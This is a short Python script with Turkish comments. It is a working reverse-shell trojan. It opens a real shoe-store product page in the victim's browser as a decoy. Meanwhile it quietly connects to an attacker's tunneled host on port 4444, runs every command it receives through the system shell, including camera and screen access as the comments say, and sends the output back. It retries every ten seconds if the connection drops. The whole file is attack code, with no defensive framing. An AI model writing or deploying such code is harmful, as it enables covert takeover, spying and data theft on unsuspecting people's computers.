import socket
import subprocess
import os
import time
import webbrowser

# --- KRALIN UZAKTAN ERİŞİM AYARLARI ---
# Terminaldeki localhost.run veya Ngrok adresini buraya yazın
SERVER_IP = 'localhost.run'  # SSH tünelinden aldığın adresi buraya yaz
PORT = 4444                  # SSH tünelinden aldığın portu buraya yaz
# --------------------------------------

def operasyonu_baslat():
    # 1. Şüpheleri yok et: Gerçek Nine West bot sayfasını kurbanın önünde aç
    try:
        webbrowser.open("https://www.instreet.com.tr/urun/nine-west-franco-5pr-siyah-kadin-duz-bot-102012302")
    except:
        pass

    # 2. Arka planda Kral'ın bilgisayarına sız ve emir bekle
    while True:
        try:
            # Kralın bilgisayarına siber tünel bağlantısı
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, PORT))
            
            while True:
                # Kraldan (PyCharm terminalinden) emir bekle
                komut = s.recv(4096).decode('utf-8')
                
                if not komut or komut.lower() == 'exit':
                    break
                
                # Gelen komutu gizlice çalıştır (Kamera, Ekran vb.)
                proc = subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                cikti = proc.stdout.read() + proc.stderr.read()
                
                # Sonucu Kral'a gönder
                s.send(cikti if cikti else b"Islem basarili, Kralim.")
                
        except Exception:
            # Bağlantı koparsa 10 saniye bekle ve gizlice tekrar dene
            time.sleep(10)
            continue

if __name__ == "__main__":
    operasyonu_baslat()
    